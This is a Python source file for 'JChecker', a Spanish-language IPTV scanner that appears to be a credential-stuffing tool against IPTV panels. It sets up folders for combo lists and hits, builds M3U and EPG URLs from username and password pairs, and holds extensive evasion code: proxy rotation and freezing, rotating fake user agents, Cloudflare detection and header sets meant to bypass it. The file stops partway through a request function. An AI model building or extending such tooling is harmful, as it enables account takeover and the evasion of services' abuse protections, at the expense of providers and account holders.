#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JChecker v5.7 - Escáner de IPTV por JC
"""

import sys
import os
import re
import json
import time
import random
import socket
import logging
import argparse
import threading
import queue
import codecs
import shutil
from datetime import datetime, date

try:
    import cloudflare_bypass

    cloudflare_bypass.patch_jchecker_for_cloudflare()  
except ImportError as e:
    print(f"⚠️ cloudflare_bypass no encontrado: {e}")
    cloudflare_bypass = None
except Exception as e:
    print(f"⚠️ Error cargando bypass: {e}")
    cloudflare_bypass = None

from urllib.parse import urlparse
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import pickle  

DEFAULT_TIMEOUT = (1, 3)  
SOCKS_TIMEOUT = 2  
HTTP_TIMEOUT = 4   

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    import urllib3
    from urllib3.exceptions import InsecureRequestWarning
    from colorama import Fore, Back, Style, init
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    import telebot
    import progressbar
    import qrcode
    import names  

    try:
        import flag  
    except ImportError:
        flag = None

    try:
        import geoip2.database
        import pycountry
        GEOIP_ENABLED = True
    except ImportError:
        GEOIP_ENABLED = False

    try:
        import socks
        from sockshandler import SocksiPyHandler
        SOCKS_SUPPORT = True
    except ImportError:
        try:
            from urllib3.contrib.socks import SOCKSProxyManager
            SOCKS_SUPPORT = True
        except ImportError:
            SOCKS_SUPPORT = False
            print("ADVERTENCIA: Para usar proxies SOCKS5 con autenticación, instale: pip install pysocks requests[socks]")

except ImportError as e:
    print(f"Error: Falta instalar algunas dependencias. {e}")
    print("Ejecute: pip install requests colorama bs4 fake-useragent telebot progressbar2 pyTelegramBotAPI qrcode geoip2 pycountry flag pysocks requests[socks]")
    sys.exit(1)

if os.name == 'nt':
    try:
        import ctypes

        import locale
        locale.setlocale(locale.LC_ALL, 'C')
    except ImportError:
        ctypes = None

import locale
try:
    locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
except:
    try:
        locale.setlocale(locale.LC_ALL, 'C.UTF-8')
    except:
        pass

init(autoreset=True)  
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  

CONFIG_FILE = 'jchecker_config.json'

DIRECTORIES = ['combo', 'hits', 'Proxies', 'sound', 'logs', 'proxy_cache']

old_excepthook = threading.excepthook

server_content_cache = {}
content_cache_lock = threading.Lock()
global_get_categories = False

class ProxyTimeoutManager:

    def __init__(self):
        self.proxy_timeouts = {}  
        self.proxy_last_response = {}  
        self.frozen_proxies = set()  
        self.timeout_threshold = 1  
        self.response_timeout = 3  
        self.lock = threading.RLock()  

    def is_proxy_frozen(self, proxy):

        if not proxy:
            return False

        with self.lock:
            proxy_str = self._proxy_to_str(proxy)
            return proxy_str in self.frozen_proxies

    def mark_proxy_frozen(self, proxy, reason="timeout"):

        if not proxy:
            return

        proxy_str = self._proxy_to_str(proxy)
        self.frozen_proxies.add(proxy_str)
        logger.warning(f"Proxy {proxy_str} marcado como CONGELADO: {reason}")

        if hasattr(proxy_manager, 'remove_proxy'):
            proxy_manager.remove_proxy(proxy)

    def record_timeout(self, proxy):

        if not proxy:
            return

        proxy_str = self._proxy_to_str(proxy)
        self.proxy_timeouts[proxy_str] = self.proxy_timeouts.get(proxy_str, 0) + 1

        logger.debug(f"Timeout #{self.proxy_timeouts[proxy_str]} para proxy {proxy_str}")

        if self.proxy_timeouts[proxy_str] >= self.timeout_threshold:
            self.mark_proxy_frozen(proxy, f"multiple_timeouts_{self.proxy_timeouts[proxy_str]}")

    def record_response(self, proxy):

        if not proxy:
            return

        proxy_str = self._proxy_to_str(proxy)
        self.proxy_last_response[proxy_str] = time.time()

        if proxy_str in self.proxy_timeouts:
            self.proxy_timeouts[proxy_str] = max(0, self.proxy_timeouts[proxy_str] - 1)

    def _proxy_to_str(self, proxy):

        if not proxy:
            return ""
        http_proxy = proxy.get('http', '')
        if http_proxy:
            return http_proxy.split('://')[-1].split('@')[-1]
        return ""

proxy_timeout_manager = ProxyTimeoutManager()

def silent_exception_hook(args):

    if args.exc_type != SystemExit:

        logger.error(f"Error en hilo {args.thread.name}: {args.exc_value}")

def set_window_title(nuevo_titulo):

    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(nuevo_titulo)
    else:
        sys.stdout.write(f"\033]0;{nuevo_titulo}\a")
        sys.stdout.flush()

def detect_device_type():

    try:

        if sys.platform == "win32":
            import ctypes

            return 'pc'
        else:

            return 'android'

    except:
        return 'pc'  

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    GREY = '\033[90m'
    BLACK = '\033[90m'

    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'

    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

    RESET = '\033[0m'

    @classmethod
    def random_color(cls):

        colors = [cls.RED, cls.GREEN, cls.BLUE, cls.CYAN, cls.YELLOW, cls.MAGENTA]
        return random.choice(colors)

    @classmethod
    def random_bg(cls):

        bgs = [cls.BG_RED, cls.BG_GREEN, cls.BG_BLUE, cls.BG_CYAN, cls.BG_MAGENTA, cls.BG_YELLOW]
        return random.choice(bgs)

def input_with_timeout(prompt, timeout=10, default_response="continuar"):

    import sys
    import select

    print(prompt, end='', flush=True)

    if os.name == 'nt':
        import msvcrt
        import time

        start_time = time.time()
        user_input = ""

        while True:
            if msvcrt.kbhit():
                char = msvcrt.getwche()
                if char == '\r':  
                    print()  
                    return user_input.lower()
                elif char == '\x08':  
                    if user_input:
                        user_input = user_input[:-1]
                        sys.stdout.write('\b \b')
                        sys.stdout.flush()
                else:
                    user_input += char

            elapsed = time.time() - start_time
            if elapsed >= timeout:
                print(f"\n{Colors.YELLOW}⏱ Tiempo agotado ({timeout}s). Continuando automáticamente...{Colors.RESET}")
                return default_response

            time.sleep(0.1)
    else:

        ready, _, _ = select.select([sys.stdin], [], [], timeout)

        if ready:
            response = sys.stdin.readline().strip().lower()
            return response
        else:
            print(f"\n{Colors.YELLOW}⏱ Tiempo agotado ({timeout}s). Continuando automáticamente...{Colors.RESET}")
            return default_response

proxy_cache = {}

class QuickFreezeDetector:

    def __init__(self):
        self.last_activity = {}
        self.freeze_threshold = 3  
        self.last_progress_check = 0
        self.last_checked_count = 0
        self.progress_stall_threshold = 5  
        self.recovery_actions = 0
        self.max_recovery_actions = 3

    def record_activity(self, thread_id):

        self.last_activity[thread_id] = time.time()

    def check_progress_stall(self, current_checked):

        current_time = time.time()

        if current_time - self.last_progress_check < 2:
            return False

        if current_checked == self.last_checked_count:
            if current_time - self.last_progress_check > self.progress_stall_threshold:
                logger.warning(f"CONGELAMIENTO DETECTADO: Sin progreso por {self.progress_stall_threshold}s")
                self.last_progress_check = current_time
                return True
        else:

            self.last_checked_count = current_checked

        self.last_progress_check = current_time
        return False

    def check_frozen_threads(self):

        current_time = time.time()
        frozen_threads = []

        for thread_id, last_time in self.last_activity.items():
            if current_time - last_time > self.freeze_threshold:
                frozen_threads.append(thread_id)

        return frozen_threads

    def trigger_recovery(self, checker_instance):

        if self.recovery_actions >= self.max_recovery_actions:
            logger.error("Máximo de acciones de recuperación alcanzado")
            return False

        self.recovery_actions += 1
        logger.warning(f"ACTIVANDO RECUPERACIÓN AUTOMÁTICA #{self.recovery_actions}")

        try:

            if hasattr(proxy_manager, 'force_proxy_rotation'):
                proxy_manager.force_proxy_rotation()
                logger.info("OK Rotacion forzada de proxies activada")

            frozen_threads = self.check_frozen_threads()
            if frozen_threads:
                logger.warning(f"Threads congelados detectados: {frozen_threads}")

                for thread_id in frozen_threads:
                    if thread_id in self.last_activity:
                        del self.last_activity[thread_id]

            if hasattr(checker_instance, 'task_queue'):
                queue_size = checker_instance.task_queue.qsize()
                if queue_size > 100:  
                    logger.warning(f"Cola de tareas muy grande: {queue_size} - Posible bloqueo")

            if self.recovery_actions >= 2:
                logger.warning("Recuperación crítica - considerando reinicio de threads")
                if hasattr(checker_instance, '_restart_stalled_threads'):
                    checker_instance._restart_stalled_threads()

            logger.info(f"Recuperación #{self.recovery_actions} completada")
            return True

        except Exception as e:
            logger.error(f"Error en recuperación automática: {e}")
            return False

freeze_detector = QuickFreezeDetector()

class CustomFormatter(logging.Formatter):

    def __init__(self):
        super().__init__()
        self.formats = {
            logging.DEBUG: Colors.GREY + "%(asctime)s - %(levelname)s - %(message)s" + Colors.RESET,
            logging.INFO: Colors.CYAN + "%(asctime)s - %(levelname)s - %(message)s" + Colors.RESET,
            logging.WARNING: Colors.YELLOW + "%(asctime)s - %(levelname)s - %(message)s" + Colors.RESET,
            logging.ERROR: Colors.RED + "%(asctime)s - %(levelname)s - %(message)s" + Colors.RESET,
            logging.CRITICAL: Colors.RED + Colors.BOLD + "%(asctime)s - %(levelname)s - %(message)s" + Colors.RESET
        }

    def format(self, record):
        log_fmt = self.formats.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt='%Y-%m-%d %H:%M:%S')
        return formatter.format(record)

def setup_logger_(console_output=True):  
    logger = logging.getLogger()

    logger.setLevel(logging.DEBUG)

    log_file = f'logs/jchecker_{datetime.now().strftime("%Y%m%d")}.log'
    os.makedirs('logs', exist_ok=True)
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)  
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    ))

    logger.handlers = []
    logger.addHandler(file_handler)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG)  
    console_handler.setFormatter(CustomFormatter())
    logger.addHandler(console_handler)

    return logger

def setup_logger(console_output=False):

    logger = logging.getLogger()

    log_level = os.environ.get('JCHECKER_LOG_LEVEL', 'INFO')
    numeric_level = getattr(logging, log_level.upper(), logging.INFO)
    logger.setLevel(numeric_level)

    log_file = f'logs/jchecker_{datetime.now().strftime("%Y%m%d")}.log'
    os.makedirs('logs', exist_ok=True)
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)  
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    ))

    logger.handlers = []
    logger.addHandler(file_handler)

    if console_output:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(numeric_level)
        console_handler.setFormatter(CustomFormatter())
        logger.addHandler(console_handler)

    return logger

def get_terminal_width():

    try:
        return shutil.get_terminal_size().columns
    except:
        return 80  

def hide_cursor():

    print('\033[?25l', end='', flush=True)

def show_cursor():

    print('\033[?25h', end='', flush=True)

def clear_screen():

    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():

    c1 = Colors.random_color()
    c2 = Colors.random_color()
    while c2 == c1:
        c2 = Colors.random_color()

    banner = f"""{c1}{Colors.BOLD}
           __     ______   ______   __   __            
          /\\ \\   /\\  == \\ /\\__  _\\ /\\ \\ / /            
          \\ \\ \\  \\ \\  _-/ \\/_/\\ \\/ \\ \\ \\' /             
           \\ \\_\\  \\ \\_\\      \\ \\_\\  \\ \\__|             
            \\/_/   \\/_/       \\/_/   \\/_/              {Colors.RESET}{c2}{Colors.BOLD}
            _______           __                       
           / ___/ /  ___ ____/ /_____ ____             
          / /__/ _ \\/ -_) __/  '_/ -_) __/             
          \\___/_//_/\\__/\\__/_/\\_\\__/_/                {Colors.BLACK}{Colors.BG_BLACK} {Colors.BG_WHITE}{Colors.BOLD}
                       v5.7 by JC                      {Colors.RESET}"""
    print(banner)
    print(f"\n{Colors.CYAN}JChecker v5.7.1 - IPTV Scanner{Colors.RESET}")
    print(f"{Colors.YELLOW}Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}\n")

def print_status(message, status="info"):

    status_colors = {
        "success": Colors.GREEN,
        "error": Colors.RED,
        "warning": Colors.YELLOW,
        "info": Colors.CYAN,
        "debug": Colors.GREY
    }

    status_icons = {
        "success": "[OK]",
        "error": "[ERR]",
        "warning": "⚠",
        "info": "ℹ",
        "debug": "⚙"
    }

    color = status_colors.get(status, Colors.WHITE)
    icon = status_icons.get(status, "•")

    print(f"{color}{Colors.BOLD}{icon} {message}{Colors.RESET}")

def progress_bar(current, total, prefix="", suffix="", length=30):

    progress = min(1.0, current / total) if total > 0 else 0

    filled_length = int(length * progress)

    filled_length = min(filled_length, length)

    bar = '█' * filled_length + '░' * (length - filled_length)

    percentage = min(100, 100 * current // total) if total > 0 else 0

    terminal_width = get_terminal_width()
    full_bar = f"\r{prefix} |{bar}| {percentage}% {suffix}"

    if len(full_bar) > terminal_width:
        suffix_len = min(len(suffix), terminal_width // 4)
        prefix_len = min(len(prefix), terminal_width // 4)
        available_space = terminal_width - prefix_len - suffix_len - 10
        bar_length = max(10, available_space)

        filled_length = int(bar_length * progress)
        filled_length = min(filled_length, bar_length)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        full_bar = f"\r{prefix[:prefix_len]} |{bar}| {percentage}% {suffix[:suffix_len]}"

    print(full_bar, end='', flush=True)

def animated_text(text, delay=0.02):

    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def create_directories():

    for directory in DIRECTORIES:
        if not os.path.exists(directory):
            os.makedirs(directory)
            if logger:
                logger.debug(f"Directorio creado: {directory}")

ua = UserAgent()
uagent = {'User-Agent': ua.random}

def build_m3u_url(panel_url, user, password, is_xui=False):
    """
    Construye la URL M3U correcta según el tipo de panel.
    - XUI One: {base}/playlist/{user}/{password}/m3u_plus
    - Estándar: {base}/get.php?username={user}&password={password}&type=m3u_plus
    El campo 'xui' viene en server_info de la respuesta de player_api.php.
    """
    base = panel_url.rstrip('/')
    if is_xui:
        return f"{base}/playlist/{user}/{password}/m3u_plus"
    return f"{base}/get.php?username={user}&password={password}&type=m3u_plus"

def build_epg_url(panel_url, user, password, is_xui=False):
    """
    Construye la URL EPG correcta según el tipo de panel.
    - XUI One: {base}/playlist/{user}/{password}/xmltv
    - Estándar: {base}/xmltv.php?username={user}&password={password}
    """
    base = panel_url.rstrip('/')
    if is_xui:
        return f"{base}/playlist/{user}/{password}/xmltv"
    return f"{base}/xmltv.php?username={user}&password={password}"

def get_headers(url, bypass_cloudflare=False, mobile=False, use_random_ua=False):

    parsed = urlparse(url)
    is_https = parsed.scheme == 'https'
    host = parsed.netloc

    def get_user_agent(ua_type='chrome'):
        if use_random_ua:
            try:
                if ua_type == 'mobile':
                    return ua.safari  
                elif ua_type == 'firefox':
                    return ua.firefox
                else:
                    return ua.chrome
            except:

                pass

        static_uas = {
            'chrome': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            'firefox': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            'mobile': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            'safari': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15"
        }
        return static_uas.get(ua_type, static_uas['chrome'])

    if bypass_cloudflare or mobile:

        if mobile:
            headers = {
                "Host": host,
                "User-Agent": get_user_agent('mobile'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0"
            }
        else:
            headers = {
                "Host": host,
                "User-Agent": get_user_agent('chrome'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Cache-Control": "max-age=0",
                "DNT": "1"
            }
    else:

        if is_https:
            host = f"{parsed.hostname}:443"
        else:
            host = parsed.netloc

        headers = {
            "Host": host,
            "User-Agent": get_user_agent('chrome'),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

        if is_https:
            headers.update({
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            })

    return headers

class CloudflareDetector:
    """Detecta y maneja sitios protegidos por Cloudflare"""

    def __init__(self):
        self.cloudflare_domains = set()
        self.detection_cache = {}
        self.ua_generator = UserAgent() if 'UserAgent' in globals() else None

    def is_cloudflare_protected(self, url_or_domain):
        """Detecta si un sitio usa Cloudflare"""
        domain = self._extract_domain(url_or_domain)

        if domain in self.detection_cache:
            return self.detection_cache[domain]

        try:

            test_url = f"http://{domain}" if not url_or_domain.startswith('http') else url_or_domain

            response = requests.get(
                test_url,
                headers=get_headers(test_url),
                timeout=2,
                verify=False,
                allow_redirects=True
            )

            is_cf = self._detect_cloudflare_in_response(response)
            self.detection_cache[domain] = is_cf

            if is_cf:
                self.cloudflare_domains.add(domain)
                logger.info(f"Cloudflare detectado en {domain}")

            return is_cf

        except Exception as e:
            logger.debug(f"Error detectando Cloudflare en {domain}: {e}")
            return False

    def _extract_domain(self, url_or_domain):
        """Extrae el dominio de una URL"""
        if url_or_domain.startswith('http'):
            return urlparse(url_or_domain).netloc.split(':')[0]
        return url_or_domain.split(':')[0]

    def _detect_cloudflare_in_response(self, response):
        """Detecta Cloudflare en la respuesta"""
        if not response:
            return False

        cf_headers = [
            'cf-ray', 'cf-cache-status', 'cf-request-id', 
            'server', '__cfduid', 'cf-connecting-ip',
            'cf-visitor', 'cf-ipcountry'
        ]

        has_cf_headers = any(header.lower() in [h.lower() for h in response.headers.keys()] 
                           for header in cf_headers)

        server_header = response.headers.get('server', '').lower()
        is_cf_server = 'cloudflare' in server_header

        cf_content_patterns = [
            'checking your browser',
            'ddos protection by cloudflare',
            'ray id:',
            'cloudflare',
            'cf-browser-verification',
            'challenge-platform',
            'please wait while we are checking your browser'
        ]

        has_cf_content = False
        if hasattr(response, 'text'):
            response_text = response.text.lower()
            has_cf_content = any(pattern in response_text for pattern in cf_content_patterns)

        is_protection_code = response.status_code in [403, 503, 429, 521, 522, 523, 524]

        return has_cf_headers or is_cf_server or has_cf_content or (is_protection_code and has_cf_headers)

    def get_bypass_headers(self, url, attempt=1, use_fake_ua=True):
        """Obtiene headers específicos para bypasear Cloudflare con UA aleatorio"""
        domain = self._extract_domain(url)

        def get_random_ua(browser_type=None):
            if use_fake_ua and self.ua_generator:
                try:
                    if browser_type == 'chrome':
                        return self.ua_generator.chrome
                    elif browser_type == 'firefox':
                        return self.ua_generator.firefox
                    elif browser_type == 'safari':
                        return self.ua_generator.safari
                    else:
                        return self.ua_generator.random
                except:
                    pass

            fallback_uas = {
                'chrome': [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ],
                'firefox': [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
                ],
                'safari': [
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
                ]
            }

            browser_uas = fallback_uas.get(browser_type, fallback_uas['chrome'])
            return random.choice(browser_uas)

        if attempt == 1:

            return {
                "Host": domain,
                "User-Agent": get_random_ua('chrome'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Cache-Control": "max-age=0",
                "DNT": "1"
            }
        elif attempt == 2:

            return {
                "Host": domain,
                "User-Agent": get_random_ua('safari'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            }
        elif attempt == 3:

            return {
                "Host": domain,
                "User-Agent": get_random_ua('firefox'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            }
        else:

            return {
                "Host": domain,
                "User-Agent": get_random_ua(),
                "Accept": "*/*"
            }

class HTTPSessionManager:
    """Gestiona sesiones HTTP optimizadas para el escaneo con rotación de UA"""

    def __init__(self, max_retries=3, timeout=(3, 6), verify_ssl=False):
        self.max_retries = max_retries
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.ua_generator = self._create_user_agent()
        self.current_ua = None
        self.ua_rotation_counter = 0
        self.ua_rotation_interval = 50  

    def _create_user_agent(self):
        """Crea un objeto UserAgent para rotar user agents"""
        try:
            return UserAgent()
        except:
            logger.warning("No se pudo inicializar UserAgent, usando UA estático")

            class StaticUA:
                def __init__(self):
                    self.user_agents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                        'VLC/3.0.16 LibVLC/3.0.16',
                        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                        'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/115.0'
                    ]
                    self.current = random.choice(self.user_agents)

                @property
                def random(self):
                    self.current = random.choice(self.user_agents)
                    return self.current

                @property
                def chrome(self):
                    chrome_uas = [ua for ua in self.user_agents if 'Chrome' in ua and 'Edg' not in ua]
                    return random.choice(chrome_uas)

                @property
                def firefox(self):
                    firefox_uas = [ua for ua in self.user_agents if 'Firefox' in ua]
                    return random.choice(firefox_uas)

                @property
                def safari(self):
                    safari_uas = [ua for ua in self.user_agents if 'Safari' in ua and 'Chrome' not in ua]
                    return random.choice(safari_uas)

                def set_ua(self, user_agent):
                    """Establece un User-Agent específico"""
                    self.current = user_agent
                    return user_agent

            return StaticUA()

    def get_rotated_ua(self, ua_type='random'):
        """Obtiene un User-Agent con rotación inteligente"""
        self.ua_rotation_counter += 1

        if self.ua_rotation_counter % self.ua_rotation_interval == 0 or self.current_ua is None:
            try:
                if ua_type == 'random':
                    self.current_ua = self.ua_generator.random
                elif ua_type == 'chrome':
                    self.current_ua = self.ua_generator.chrome
                elif ua_type == 'firefox':
                    self.current_ua = self.ua_generator.firefox
                elif ua_type == 'safari':
                    self.current_ua = self.ua_generator.safari
                else:
                    self.current_ua = self.ua_generator.random

                logger.debug(f"Rotación de UA: {self.current_ua}")
            except Exception as e:
                logger.debug(f"Error en rotación de UA: {e}")

                self.current_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        return self.current_ua

    def create_session(self, ua_type='random'):
        """Crea una sesión HTTP optimizada con UA rotativo"""
        session = requests.Session()

        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"]
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        session.verify = self.verify_ssl

        ua = self.get_rotated_ua(ua_type)
        session.headers.update({'User-Agent': ua})

        return session

    def set_specific_ua(self, user_agent):
        """Establece un User-Agent específico"""
        if hasattr(self.ua_generator, 'set_ua') and callable(self.ua_generator.set_ua):

            self.current_ua = self.ua_generator.set_ua(user_agent)
        else:

            self.current_ua = user_agent
        return self.current_ua

    def get_random_ua(self):
        """Obtiene un User-Agent aleatorio"""
        if hasattr(self.ua_generator, 'random'):
            self.current_ua = self.ua_generator.random
        else:
            self.current_ua = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15'
            ])
        return self.current_ua

    def make_request(self, url, session=None, proxies=None, headers=None, 
                                     stream=False, allow_redirects=True, timeout=None, 
                                     bypass_cloudflare=False):
        """Realiza petición HTTP con detección avanzada de proxies congelados"""

        start_time = time.time()

        if proxies and proxy_timeout_manager.is_proxy_frozen(proxies):
            logger.debug("Proxy congelado detectado, saltando...")
            return None

        if session is None:
            _session = self.create_session()
            close_session = True
        else:
            _session = session
            close_session = False

        if timeout is None:
            timeout = (1, 3) if not bypass_cloudflare else (2, 4)  

        request_completed = threading.Event()
        response_container = [None]
        exception_container = [None]

        def make_request_thread():
            """Thread separado para la petición HTTP"""
            try:
                response = _session.get(
                    url,
                    proxies=proxies,
                    timeout=timeout,
                    stream=stream,
                    allow_redirects=allow_redirects,
                    headers=headers
                )
                response_container[0] = response

            except Exception as e:
                exception_container[0] = e
            finally:
                request_completed.set()

        request_thread = threading.Thread(target=make_request_thread, daemon=True)
        request_thread.start()

        total_timeout = 10  

        if request_completed.wait(timeout=total_timeout):

            if exception_container[0]:

                exception = exception_container[0]

                if proxies:
                    if isinstance(exception, (requests.exceptions.Timeout, 
                                            requests.exceptions.ConnectTimeout,
                                            requests.exceptions.ReadTimeout)):
                        proxy_timeout_manager.record_timeout(proxies)
                        logger.debug("Timeout registrado para proxy")
                    else:
                        proxy_timeout_manager.mark_proxy_frozen(proxies, f"exception_{type(exception).__name__}")

                return None
            else:

                response = response_container[0]

                if proxies and response:
                    proxy_timeout_manager.record_response(proxies)

                request_time = time.time() - start_time
                logger.debug(f"Request exitoso en {request_time:.2f}s")

                return response
        else:

            logger.warning(f"Request CONGELADO después de {total_timeout}s")

            if proxies:
                proxy_timeout_manager.mark_proxy_frozen(proxies, "total_timeout_freeze")

            try:
                if close_session:
                    _session.close()
            except:
                pass

            return None

    def make_request_backup(self, url, session=None, proxies=None, headers=None, stream=False, 
                allow_redirects=True, timeout=None, bypass_cloudflare=False):
        """Realiza petición HTTP con manejo inteligente de Cloudflare"""
        start_time = time.time()

        domain = urlparse(url).netloc.split(':')[0]

